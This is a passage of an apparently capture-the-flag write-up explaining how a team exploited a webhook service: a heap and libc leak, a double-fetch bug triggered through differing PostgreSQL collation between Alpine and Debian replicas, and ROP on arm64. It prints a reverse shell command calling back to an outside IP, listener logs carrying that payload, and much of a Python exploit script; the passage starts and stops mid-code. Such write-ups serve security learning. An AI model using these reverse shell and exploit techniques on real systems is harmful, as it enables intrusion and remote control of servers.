</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">#for t in all_threads:</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#    t.running = False # it would need to build own class Thread</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#    t.join()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>If you run the listening server and then execute the <code>solve.py</code> file, you will get this kind of leaks in the listening server.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[DEBUG] addr: (&#39;18.136.207.27&#39;, 58464)
</span></span><span class="line"><span class="cl">[DEBUG] accept ... waiting
</span></span><span class="line"><span class="cl">recv_data: b&#39;POST /?x=__/plugins____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________\xf8\x8ao\x85\xff\xff HTTP/1.1\r\nHost: 18.143.50.149:4\r\nAccept: */*\r\nX-Digest: ef3e57dc85ba8e5ee44f7ca96f0c4c33e038d71c5d08581f7d064c3532fa982f\r\nContent-Length: 22\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nkind=rum&amp;size=1&amp;item=4&#39;
</span></span><span class="line"><span class="cl">[DEBUG] addr: (&#39;18.136.207.27&#39;, 54554)
</span></span><span class="line"><span class="cl">[DEBUG] accept ... waiting
</span></span><span class="line"><span class="cl">recv_data: b&#39;POST /?x=__/plugins______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________bash -c &#34;bash -i &gt;&amp; /dev/tcp/18.143.50.149/6666 0&gt;&amp;1&#34;;________________________\x90\xf2\x80\xea\xaa\xaa HTTP/1.1\r\nHost: 18.143.50.149:4\r\nAccept: */*\r\nX-Digest: 7c90b945182bc0e9a1c8ff5b8befb435f1cf9314a32c3d6643437db55b86e1ba\r\nContent-Length: 25\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nkind=anchor&amp;size=1&amp;item=5&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>It&rsquo;s important to note that both of the <code>curl</code> request URL parameters that we received contained an appended <code>libc</code> and <code>heap</code> address.</p>
<div class="details admonition warning open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-exclamation-triangle fa-fw" aria-hidden="true"></i>Fun Fact 1<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>Notice that the <code>solve.py</code> scripts contains a lot of <code>sleep</code> after calling the <code>notify</code>. I know it&rsquo;s weird, but due to the buggy listening server that we use, we need to add delays between each <code>notify</code> to get the leak.</p>
<p>If we failed to get the leak even after the <code>sleep</code>, we need to respawn a new instance and re-run the solver script again (and maybe adjust the <code>sleep</code> time again lol).</p>
<p>It&rsquo;s not elegant, but hey it works :)</p>
</div>
        </div>
    </div>
<div class="details admonition warning open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-exclamation-triangle fa-fw" aria-hidden="true"></i>Fun Fact 2<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">We actually try to code a new listening server to increase the reliability of our libc leak later. While it is reliable in our local, it didn&rsquo;t work in the remote server. So we decided to keep using this buggy listening server code :)</div>
        </div>
    </div>
<p>With a method in place to obtain a useful leak, we can move on to the next step, which involves triggering the double-fetch bug.</p>
<h4 id="triggering-double-fetch-bug">Triggering double-fetch bug</h4>
<p>My teammates (Riatre, sampriti, and khokho) were the one who tried to trigger this bug by playing around the PostgreSQL. Despite spending a significant amount of time attempting to race and trigger the double-fetch bug, we were ultimately unsuccessful to trigger it in remote (it worked sometimes in the local). Fortunately, the authors provided us with a hint that proved to be quite helpful.</p>
<div class="details admonition info open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Hint from authors<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">The intended solution does NOT involve a race condition. The only randomness in the intended solution is ASLR. The proof of work is intentionally high and will not be lowered. Look more closely at the differences between the Dockerfile in maindb and workerdb.</div>
        </div>
    </div>
<p>After inspecting the <code>Dockerfile</code>, we discovered that although both <code>maindb</code> and <code>workerdb</code> utilized the same version of <code>PostgreSQL</code>, they were installed on different operating systems. Specifically, <code>maindb</code> was installed on <code>alpine</code>, whereas <code>workerdb</code> was installed on <code>debian</code>.</p>
<p>In an attempt to better understand the impact of utilizing different operating systems within a master-slave cluster, we came across an informative <a href="https://wiki.postgresql.org/wiki/Locale_data_changes" target="_blank" rel="noopener noreffer ">article</a>, that discussed the potential issues that could arise in streaming replication due to differences in locale. We also discovered another <a href="https://www.postgresql.org/message-id/flat/BA6132ED-1F6B-4A0B-AC22-81278F5AB81E%40tripadvisor.com" target="_blank" rel="noopener noreffer ">article</a> that served to reinforce our suspicions that there may be an issue related to locale which caused different collation behavior. After testing the provided POC within the aforementioned article, it became clear that our concerns were indeed warranted.</p>
<img src="https://i.imgur.com/9axs66H.png">
<p>Given our newfound understanding of the potential issues that can arise due to differences in locale within a master-slave cluster, we realized that we actually don&rsquo;t need to trigger a race. Instead, our focus shifted to manipulating the index in such a way that the <code>SELECT COUNT(*)</code> query would return a smaller value than the actual result obtained via the <code>SELECT target, secret</code> query.</p>
<p>My teammate Riatre were able to devise a POC that resulted in the <code>SELECT COUNT(*)</code> query returning a value of <code>0</code>, despite the <code>SELECT target, secret</code> query yielding a total of <code>10</code> rows. While our initial approach had utilized <code>unicode</code>, which we soon discovered was not allowed, Riatre discovered that we could leverage the differing results of the <code>'E' &gt; 'd'</code> comparison between <code>maindb</code> and <code>workerdb</code> to trigger the double-fetch bug.</p>
<p>The POC is:</p>
<ul>
<li>Insert <code>1000</code> hooks with <code>kind=d</code>.</li>
<li>Insert <code>1000</code> hooks with <code>kind=E</code>.</li>
<li>Sleep for <code>1 minute</code> to wait for auto vacuum</li>
</ul>
<p>After running the POC, <code>workerdb</code> was unable to interpret the <code>index</code> correctly due to the differing results of the comparison, causing the count query to produce <code>0</code> and the second query to yield <code>10</code> rows. This gave us a reliable way to trigger the double-fetch bug.</p>
<h4 id="obtaining-a-reverse-shell-through-oob-write">Obtaining a Reverse Shell through OOB Write</h4>
<p>Now that we have triggered the double-fetch, it means we have an OOB write in the stack. Let&rsquo;s recap what we have accomplished so far:</p>
<ul>
<li>We have obtained a <code>libc</code> and <code>heap</code> leak.</li>
<li>We are able to do OOB Write in stack.</li>
<li>We couldn&rsquo;t directly interact with the <code>webhook</code>.</li>
</ul>
<p>Due to the presence of an out-of-bounds (OOB) write in the stack, we simply need to perform ROP. By inspecting the registers using <code>gdb</code>, we observe that our <code>secrets[i]</code> value is actually loaded to registers <code>x19-x26</code> and <code>x29-x30</code>. It&rsquo;s important to note that <code>webhook</code> is an <code>arm64</code> binary, which means that the return address is stored in <code>x30</code>. This observation indicates that we have control over the <code>webhook</code> PC.</p>
<p>While examining the available gadgets in the <code>webhook libc</code>, we discovered the following useful gadget (Thanks to my teammate zxc1337):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x0000000000021af8: mov x0, x19; blr x20; 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Since we have control over both <code>x20</code> and <code>x19</code> registers, our next step is to set <code>x20</code> to the <code>system</code> function and <code>x19</code> to the address of our desired system command.</p>
<p>We attempted to set <code>x19</code> using the leaked <code>heap</code> values plus an <code>offset</code> that we derived from our local environment. However, we encountered a discrepancy between the <code>heap</code> layouts in our local and remote environments, which hindered our progress.</p>
<p>So, we decided to spray the heap with our reverse shell commands and then bruteforce the offset. Eventually, we discovered a suitable offset that led to our sprayed reverse shell commands. With this successful connection to the reverse shell, we were able to extract the flag from the database.</p>
<div class="details admonition info open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>The reverse shell command<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>At first, we tried to do the usual reverse shell command <code>bash -i &gt;&amp; /dev/tcp/18.143.50.149/6666</code>, but it doesn&rsquo;t work with <code>system()</code>. And then my teammate sampriti found out that to make the reverse shell works with <code>system()</code>, the reverse shell command need to be wrapped inside <code>bash -c</code>.</p>
<p>So, the final reverse shell command is something like this <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/18.143.50.149/6666&quot;</code>.</p>
</div>
        </div>
    </div>
<p>Here is the POC that demonstrates how to spray the heap and gain PC control using the OOB Write vulnerability:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">Any</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">logging</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">tqdm</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;aarch64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;latin&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVER_URL</span> <span class="o">=</span> <span class="s2">&#34;http://18.136.207.27:3000&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">url_for</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">SERVER_URL</span> <span class="o">+</span> <span class="n">path</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Solver</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;/_m/2e7970cbec/loggingIn&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;redirectTo&#34;</span><span class="p">:</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">watch</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">kind</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">secret</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">secret</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="o">**</span><span class="mi">64</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;/_m/34a106c003/transacting&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">files</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;action&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="s2">&#34;watch&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;kind&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">kind</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;url&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">url</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;secret&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">secret</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">            <span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">204</span><span class="p">,</span> <span class="mi">302</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="si">=}</span><span class="s2"> </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="si">=}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">loc</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s2">&#34;Location&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="n">loc</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;/?watchId=&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">loc</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="s2">&#34;/?watchId=&#34;</span><span class="p">)</span> <span class="p">:])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">unwatch</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">kind</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">watch_id</span><span class="p">:</span> <span class="nb">int</span> <span class="o">|</span> <span class="kc">None</span> <span class="o">=</span> <span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;action&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="s2">&#34;unwatch&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;kind&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">kind</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">watch_id</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">watch_id</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;/_m/34a106c003/transacting&#34;</span><span class="p">),</span> <span class="n">files</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">notify</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">kind</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="nb">dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Any</span><span class="p">]</span> <span class="o">=</span> <span class="p">{})</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;/_m/34a106c003/transacting&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">files</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;action&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="s2">&#34;notify&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;kind&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">kind</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="o">|</span> <span class="p">{</span><span class="n">k</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">data</span><span class="o">.</span><span class="n">items</span><span class="p">()},</span>
</span></span><span class="line"><span class="cl">            <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">204</span><span class="p">,</span> <span class="mi">302</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">logger</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;notify failed </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="si">=}</span><span class="s2"> </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="si">=}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">204</span><span class="p">,</span> <span class="mi">302</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">leaked_heap</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s1">&#39;heap leak: &#39;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system_cmd</span> <span class="o">=</span> <span class="n">leaked_heap</span> <span class="o">+</span> <span class="mh">0x6000</span> <span class="c1"># Bruteforce the offset</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s1">&#39;libc leak: &#39;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main_arena_96_offset</span> <span class="o">=</span> <span class="mh">0x170af8</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">leaked_libc</span> <span class="o">-</span> <span class="n">main_arena_96_offset</span>
</span></span><span class="line"><span class="cl"><span class="n">mov_x0_x19_blr_x20</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000021af8</span> <span class="c1"># mov x0, x19; blr x20;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">M</span> <span class="o">=</span> <span class="s2">&#34;d&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">FLOWER</span> <span class="o">=</span> <span class="s2">&#34;E&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">PAYLOAD</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x4141414141414141</span><span class="p">,</span> <span class="n">mov_x0_x19_blr_x20</span><span class="p">,</span> <span class="n">system_cmd</span><span class="p">,</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x40890</span><span class="p">,</span> <span class="mh">0x4545454545454545</span><span class="p">,</span> <span class="mh">0x4646464646464646</span><span class="p">,</span> <span class="mh">0x4747474747474747</span><span class="p">,</span> <span class="mh">0x4848484848484848</span><span class="p">,</span> <span class="mh">0x4949494949494949</span><span class="p">,</span> <span class="mh">0x5050505050505050</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="mi">114514</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">RANDOMISH_STRING_FOR_M</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">2467</span><span class="p">))</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="n">RANDOMISH_STRING_FOR_FLOWER</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">2467</span><span class="p">))</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">)]</span>
